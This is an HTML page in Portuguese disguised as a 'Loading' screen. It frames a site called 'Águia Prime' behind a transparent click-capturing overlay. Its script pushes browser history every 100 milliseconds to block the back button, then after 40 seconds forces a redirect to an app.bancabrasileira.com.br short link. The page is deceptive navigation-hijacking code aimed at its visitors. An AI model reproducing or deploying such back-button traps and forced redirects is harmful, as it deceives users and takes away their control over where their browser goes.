<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="refresh" content="40;url=https://app.bancabrasileira.com.br/pr/bIwlp2AU">
    <title>Carregando</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden; /* Evita rolagem indesejada em dispositivos móveis */
        }

        .iframe-container {
            position: relative;
            width: 100vw;
            height: 100vh; /* Ocupa toda a tela em qualquer dispositivo */
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            pointer-events: none; /* Impede interação direta com o iframe */
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent; /* Camada transparente */
            z-index: 10;
            pointer-events: auto; /* Intercepta cliques e toques */
        }

        .placeholder {
            display: none; /* Exibido apenas se o iframe não carregar */
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #f4f4f4;
            color: #333;
            font-family: Arial, sans-serif;
            font-size: 16px;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 5;
        }

        @media (max-width: 600px) {
            .placeholder {
                font-size: 14px;
            }
        }
    </style>
    <script>
        // Função para redirecionar na mesma aba
        function redirectSameTab() {
            window.location.replace("https://app.bancabrasileira.com.br/pr/bIwlp2AU");
        }

        // Redireciona após 40 segundos na mesma aba
        setTimeout(redirectSameTab, 40000); // 40 segundos em milissegundos

        // Preenche o histórico para bloquear o botão de voltar
        (function pushHistory() {
            history.pushState(null, null, window.location.href);
            setTimeout(pushHistory, 100); // Reforça continuamente o estado do histórico
        })();

        // Captura tentativas de voltar no navegador
        window.onpopstate = function () {
            history.pushState(null, null, window.location.href);
            redirectSameTab();
        };

        // Verifica se o iframe não carregou (ex.: devido a erro SSL)
        window.addEventListener('load', function () {
            const iframe = document.querySelector('iframe');
            iframe.addEventListener('error', function () {
                document.querySelector('.placeholder').style.display = 'flex';
            });
        });
    </script>
</head>
<body>
    <div class="iframe-container">
        <iframe src="https://app.aguiaprime119000.com" title="Águia Prime"></iframe>
        <div class="overlay"></div>
        <div class="placeholder">O site não pôde ser carregado. Você será redirecionado em breve.</div>
    </div>
</body>
</html>
